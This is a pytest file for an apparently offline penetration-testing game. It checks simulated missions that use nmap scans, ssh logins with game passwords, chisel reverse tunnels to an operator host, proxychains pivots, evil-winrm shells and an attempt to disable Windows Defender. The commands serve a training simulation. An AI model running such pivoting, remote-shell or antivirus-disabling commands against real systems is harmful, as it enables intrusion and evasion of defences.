"""Parcours jouables hors ligne des trois premières missions Lenoir."""
from pathlib import Path
import pytest
from engine import contracts, console_sessions, terminal
from engine.game_loop import GameLoop, load_all_abilities
from engine.persistence import state_from_dict, state_to_dict
from engine.act3 import CHAPTERS, journey, lock_reason
from engine.act2 import CHAPTERS as ACT2
from support import command

ROOT = Path(__file__).parents[1]
ABILITIES = load_all_abilities()


def start(cid):
    c=contracts.load_contract(ROOT/'contracts'/f'{cid}.json', known_ability_ids=set(ABILITIES))
    s=contracts.start_contract(c,'Operator',known_ability_ids=set(ABILITIES))
    return s,GameLoop(s,ABILITIES)


def resume(s):
    s=state_from_dict(state_to_dict(s))
    return s,GameLoop(s,ABILITIES)


def confirm(s,loop):
    contracts.player_message(s,'telegrid','constat')
    loop.finish_if_won()
    assert s.winner=='RED'


@pytest.mark.parametrize('cid',[cid for cid,_ in CHAPTERS])
def test_claim_alone_does_not_complete_and_help_exists(cid):
    s,loop=start(cid)
    contracts.player_message(s,'telegrid','constat')
    loop.finish_if_won()
    assert s.status=='RUNNING'
    contracts.player_message(s,'telegrid','rappel détaillé')
    assert any(tool in s.messages[-1].text for tool in ['nmap','ssh','ldapsearch','evil-winrm','curl'])
    assert '/home/operator/docs/reconnaissance.txt' in s.terminal_files


def test_first_mission_compares_discovery_then_checks_actual_services_after_resume():
    s,loop=start('act3_decouverte')
    command(s,loop,'nmap -sV -p 22,80 10.90.10.10')
    assert 'Host seems down' in s.history[-1].message
    s,loop=resume(s)
    command(s,loop,'nmap -Pn -sV -p 22,80 10.90.10.10')
    assert '22/tcp  open' in s.history[-1].message
    assert '80/tcp  closed' in s.history[-1].message
    confirm(s,loop)


def login(s,loop):
    command(s,loop,'ssh maintenance@10.90.10.10','relay')
    command(s,loop,'AsterLecture2026!','relay')


def test_second_mission_requires_real_remote_session_and_document():
    s,loop=start('act3_prestataire')
    command(s,loop,'nmap -Pn -p 22 10.90.10.11')
    command(s,loop,'nmap -Pn -p 22 10.90.10.10')
    login(s,loop)
    assert s.terminals['relay']['terminal_access']=='USER'
    s,loop=resume(s)
    command(s,loop,'cat /home/maintenance/passation.txt','relay')
    confirm(s,loop)


def test_third_mission_different_origins_and_research_stays_unreachable():
    s,loop=start('act3_origine')
    command(s,loop,'nmap -Pn -p 80 10.90.40.20')
    assert '80/tcp  filtered' in s.history[-1].message
    login(s,loop)
    command(s,loop,'cat /home/maintenance/reseau.txt','relay')
    command(s,loop,'ip route','relay')
    s,loop=resume(s)
    command(s,loop,'nmap -sV -p 80 10.90.40.20','relay')
    assert '80/tcp  open' in s.history[-1].message
    command(s,loop,'nmap -Pn -p 443 10.92.10.20','relay')
    assert '443/tcp  filtered' in s.history[-1].message
    command(s,loop,'curl http://10.90.40.20/registre.txt','relay')
    assert not terminal.parse('curl http://10.90.40.20/registre.txt',s,ABILITIES).ok
    confirm(s,loop)


def test_progression_requires_all_act2_and_prior_act3():
    s,_=start('act3_decouverte')
    data={'completed':['act2_binome'],'forum_invitation_accepted':True}
    assert lock_reason(data,s.contract)
    data['completed']=[cid for cid,*_ in ACT2]
    assert not lock_reason(data,s.contract)
    assert journey(data)['contract_id']=='act3_decouverte'
    second,_=start('act3_prestataire')
    assert lock_reason(data,second.contract)
    data['completed'] += [cid for cid,_ in CHAPTERS]
    assert 'contract_id' not in journey(data)


def tunnel(s,loop,socks=True):
    command(s,loop,'chisel server --reverse --port 8000','server')
    login(s,loop)
    remote='R:1080:socks' if socks else 'R:8081:10.90.40.20:80'
    command(s,loop,'chisel client http://10.10.14.2:8000 '+remote,'relay')


def test_fourth_mission_reverse_forward_survives_save_then_stops_on_interrupt():
    s,loop=start('act3_chisel');tunnel(s,loop,False)
    s,loop=resume(s)
    command(s,loop,'curl http://127.0.0.1:8081/registre.txt','read')
    confirm(s,loop)
    with console_sessions.using(s,'relay'):console_sessions.interrupt(s)
    assert not terminal.parse('curl http://127.0.0.1:8081/registre.txt',s,ABILITIES).ok


def test_fifth_mission_socks_scan_is_scoped_to_command_and_queued_process_lifetime():
    s,loop=start('act3_proxychains');tunnel(s,loop)
    command(s,loop,'nmap -Pn -p 80 10.90.40.20')
    for flags in ['-sS -Pn -n','-sT -n','-sU -Pn -n']:
        assert not terminal.parse('proxychains4 -f ~/routes/aster.conf nmap '+flags+' -p 80 10.90.40.20',s,ABILITIES).ok
    s,loop=resume(s)
    command(s,loop,'proxychains4 -f ~/routes/aster.conf nmap -sT -Pn -n -p 80 10.90.40.20','scan')
    assert '80/tcp  open' in s.history[-1].message
    assert not s.terminals['scan']['terminal_network_path']
    assert not terminal.parse('curl http://10.90.40.20/registre.txt',s,ABILITIES).ok
    confirm(s,loop)


def test_sixth_mission_winrm_is_reader_and_disconnects_if_tunnel_dies():
    s,loop=start('act3_winrm');tunnel(s,loop)
    command(s,loop,'proxychains4 -f ~/routes/aster.conf nmap -sT -Pn -n -p 5985 10.90.40.21','scan')
    command(s,loop,'proxychains4 -f ~/routes/aster.conf evil-winrm -i 10.90.40.21 -u audit -p LectureLenoir2026!','win')
    assert s.terminals['win']['terminal_shell']=='powershell'
    assert s.terminals['win']['terminal_access']=='USER'
    s,loop=resume(s)
    command(s,loop,'Get-Content C:\\Users\\audit\\perimetre.txt','win')
    confirm(s,loop)
    with console_sessions.using(s,'server'):console_sessions.interrupt(s)
    with console_sessions.using(s,'win'):
        assert not terminal.parse('whoami',s,ABILITIES).ok
        assert s.terminal_host is None and not s.terminal_network_path


def test_stopped_proxy_cannot_resolve_queued_scan_or_reconnect_to_restarted_server():
    s,loop=start('act3_proxychains');tunnel(s,loop)
    with console_sessions.using(s,'scan'):
        result=terminal.parse('proxychains4 -f ~/routes/aster.conf nmap -sT -Pn -n -p 80 10.90.40.20',s,ABILITIES)
        loop.submit(result.action)
    with console_sessions.using(s,'server'):console_sessions.interrupt(s)
    command(s,loop,'chisel server --reverse --port 8000','server')
    while loop.pending():loop.tick()
    assert s.history[-1].reason=='proxy_stopped'
    assert not s.tool_data['recon'].get('observations') if 'recon' in s.tool_data else True
    assert not terminal.parse('proxychains4 -f ~/routes/aster.conf curl http://10.90.40.20/registre.txt',s,ABILITIES).ok


def test_winrm_auth_and_endpoint_are_required_even_with_a_working_proxy():
    s,loop=start('act3_winrm');tunnel(s,loop)
    prefix='proxychains4 -f ~/routes/aster.conf evil-winrm -i 10.90.40.21 -u audit '
    for options in ['-p faux','-S -p LectureLenoir2026!','-P 80 -p LectureLenoir2026!']:
        assert not terminal.parse(prefix+options,s,ABILITIES).ok
    s.environment['winrm']['winrm']['users']=[]
    assert not terminal.parse(prefix+'-p LectureLenoir2026!',s,ABILITIES).ok
    assert s.terminal_host is None


def test_egress_filter_and_isolation_cut_chisel_and_all_dependent_clients():
    s,loop=start('act3_proxychains');tunnel(s,loop)
    s.environment['network_rules'].insert(0,dict(source='maintenance',target='operator',port=8000,action='deny'))
    assert not terminal.parse('proxychains4 -f ~/routes/aster.conf curl http://10.90.40.20/registre.txt',s,ABILITIES).ok
    s.environment['network_rules'].pop(0)
    s.hosts['maintenance'].status='ISOLATED'
    assert not terminal.parse('proxychains4 -f ~/routes/aster.conf curl http://10.90.40.20/registre.txt',s,ABILITIES).ok


def test_remote_process_needs_remote_kill_and_closing_owner_cuts_socks():
    s,loop=start('act3_proxychains');tunnel(s,loop)
    client=next(v for v in s.tool_services.values() if v.get('kind')=='chisel-client')
    assert not terminal.parse('kill '+str(client['pid']),s,ABILITIES).ok
    console_sessions.close(s,'relay')
    assert not terminal.parse('proxychains4 -f ~/routes/aster.conf curl http://10.90.40.20/registre.txt',s,ABILITIES).ok


def test_winrm_exit_returns_to_local_console_without_leaving_a_proxy_route():
    s,loop=start('act3_winrm');tunnel(s,loop)
    command(s,loop,'proxychains4 -f ~/routes/aster.conf evil-winrm -i 10.90.40.21 -u audit -p LectureLenoir2026!','win')
    command(s,loop,'exit','win')
    assert s.terminals['win']['terminal_host'] is None
    assert not s.terminals['win']['terminal_network_path']
    assert s.terminals['win']['terminal_shell']=='bash'


@pytest.mark.parametrize('cid',[cid for cid,_ in CHAPTERS[6:]])
def test_continuation_uses_real_commands_and_survives_resume(cid):
    from act3_validation import PATHS, expected_ok
    s,loop=start(cid)
    for console,line in PATHS[cid]:
        with console_sessions.using(s,console):
            result=terminal.parse(line,s,ABILITIES)
            assert result.ok==expected_ok(cid,console,line),(cid,line,result.output)
            if result.action: loop.submit(result.action)
        while loop.pending():loop.tick()
        s,loop=resume(s)
    confirm(s,loop)


def play_path(cid):
    from act3_validation import PATHS, expected_ok
    s,loop=start(cid)
    for console,line in PATHS[cid]:
        with console_sessions.using(s,console):
            result=terminal.parse(line,s,ABILITIES)
            assert result.ok==expected_ok(cid,console,line),result.output
            if result.action:loop.submit(result.action)
        while loop.pending():loop.tick()
    return s,loop


def test_second_chain_has_no_shortcut_and_first_transport_death_cuts_queued_scan():
    from act3_validation import double_pivot
    s,loop=start('act3_second_pivot')
    for console,line in double_pivot():command(s,loop,line,console)
    s.terminal_files['/home/operator/routes/raccourci.conf']='strict_chain\n[ProxyList]\nsocks5 10.90.10.10 1081\n'
    for config in ['aster.conf','raccourci.conf']:
        assert not terminal.parse('proxychains4 -f ~/routes/'+config+' curl http://10.92.10.20/bordereau.txt',s,ABILITIES).ok
    assert not terminal.parse('curl http://127.0.0.1:1081/bordereau.txt',s,ABILITIES).ok
    with console_sessions.using(s,'scan'):
        r=terminal.parse('proxychains4 -f ~/routes/recherche.conf nmap -sT -Pn -n -p 80 10.92.10.20',s,ABILITIES)
        assert r.ok;loop.submit(r.action)
    with console_sessions.using(s,'relay'):console_sessions.interrupt(s)
    while loop.pending():loop.tick()
    assert s.history[-1].reason=='proxy_stopped'
    assert not terminal.parse('proxychains4 -f ~/routes/recherche.conf curl http://10.92.10.20/bordereau.txt',s,ABILITIES).ok


def test_endpoint_block_preserves_protection_and_creates_no_collection():
    s,loop=play_path('act3_defender')
    assert s.environment['defender_profiles']['winrm']['realtime']
    assert not any(p.endswith('.zip') for p in s.hosts['winrm'].files)
    assert any(e['id']==1116 for e in s.tool_data['endpoint_events'])
    with console_sessions.using(s,'win'):
        r=terminal.parse('Set-MpPreference -DisableRealtimeMonitoring $true',s,ABILITIES)
        assert not r.ok
    assert 'defender:tamper-blocked:winrm' not in s.tool_data['facts']  # refus de droits avant anti-tamper


def test_defender_recheck_is_required_after_control_change_and_state_is_persistent():
    from engine.win_conditions import objective_met
    s,loop=play_path('act3_tamper')
    rule=dict(type='defender_observed',host='control',realtime=False,tamper=False)
    assert objective_met(s,rule)
    with console_sessions.using(s,'control'):
        assert terminal.parse('Set-MpPreference -DisableRealtimeMonitoring $false',s,ABILITIES).ok
    assert not objective_met(s,rule)
    assert s.environment['defender_profiles']['winrm']['realtime']
    assert s.environment['defender_profiles']['winrm']['tamper']
    s,loop=resume(s)
    assert s.environment['defender_profiles']['control']['realtime']


def test_recovery_requires_new_http_observation_after_isolation():
    from engine.win_conditions import objective_met
    s,loop=play_path('act3_second_pivot')
    condition=dict(type='http_path_observed',host='research',path='/bordereau.txt',hops=2,isolated='maintenance')
    assert not objective_met(s,condition)
    s.hosts['maintenance'].status='ISOLATED'
    assert not objective_met(s,condition)
    assert not terminal.parse('proxychains4 -f ~/routes/recherche.conf curl http://10.92.10.20/bordereau.txt',s,ABILITIES).ok


def test_lot_is_not_proven_by_a_forged_local_copy_or_a_changed_download():
    from engine.win_conditions import objective_met
    s,loop=start('act3_dossier')
    s.terminal_files['/home/operator/loot/lot-industriel.txt']=s.hosts['research'].files['/srv/web/lot-industriel.txt']
    command(s,loop,'cat ~/loot/lot-industriel.txt')
    assert not all(objective_met(s,c) for c in s.contract['investigation_steps'][0]['requires'])
    s,loop=play_path('act3_dossier')
    s.terminal_files['/home/operator/loot/lot-industriel.txt']+='modifié\n'
    assert not all(objective_met(s,c) for c in s.contract['investigation_steps'][0]['requires'])


def test_large_infrastructure_and_domains_do_not_grant_routes_or_privileges():
    s,loop=start('act3_droits')
    assert len(s.hosts)==38
    assert len({h.ip.rsplit('.',1)[0] for h in s.hosts.values()})==8
    assert len(s.environment['domains'])==2
    assert all(not d['trusts'] for d in s.environment['domains'])
    assert not s.terminal_host
    assert all(h.status=='HEALTHY' for h in s.hosts.values())
    assert not s.has_route(s.hosts['research'])


def test_second_socks_listener_is_on_server_host_and_queued_route_rechecks_acl():
    from act3_validation import double_pivot
    s,loop=start('act3_second_pivot')
    for console,line in double_pivot():command(s,loop,line,console)
    local='\n'.join(command(s,loop,'ss -lntp').output)
    assert ':1080 ' in local and ':1081 ' not in local and ':8001 ' not in local
    command(s,loop,'ssh maintenance@10.90.10.10','inspect')
    command(s,loop,'AsterLecture2026!','inspect')
    remote='\n'.join(command(s,loop,'ss -lntp','inspect').output)
    assert ':1081 ' in remote and ':8001 ' in remote and ':1080 ' not in remote
    with console_sessions.using(s,'scan'):
        r=terminal.parse('proxychains4 -f ~/routes/recherche.conf nmap -sT -Pn -n -p 80 10.92.10.20',s,ABILITIES)
        assert r.ok;loop.submit(r.action)
    s.environment['network_rules'].insert(0,dict(source='maintenance',target='maintenance',port=1081,action='deny'))
    while loop.pending():loop.tick()
    assert s.history[-1].reason=='proxy_stopped'


def test_server_bind_respects_existing_host_service_ports():
    s,loop=start('act3_second_pivot');login(s,loop)
    with console_sessions.using(s,'relay'):
        r=terminal.parse('chisel server --reverse --port 22',s,ABILITIES)
        assert not r.ok and 'already in use' in r.output[0]


def test_lot_copy_is_compared_byte_for_byte_even_after_re_reading_whitespace_edit():
    from engine.win_conditions import objective_met
    s,loop=play_path('act3_dossier')
    path='/home/operator/loot/lot-industriel.txt'
    s.terminal_files[path]+='\n'
    command(s,loop,'cat '+path)
    assert not all(objective_met(s,c) for c in s.contract['investigation_steps'][0]['requires'])


@pytest.mark.parametrize('ending',['','\n','\n\n'])
@pytest.mark.parametrize('output',['> ~/loot/exact.txt','-o ~/loot/exact.txt'])
def test_curl_preserves_http_body_exactly_through_proxy_and_redirection(ending,output):
    s,loop=start('act3_second_pivot');tunnel(s,loop)
    s.hosts['documents'].files['/srv/web/registre.txt']='octets exacts'+ending
    command(s,loop,'proxychains4 -f ~/routes/aster.conf curl http://10.90.40.20/registre.txt '+output)
    assert s.terminal_files['/home/operator/loot/exact.txt']=='octets exacts'+ending
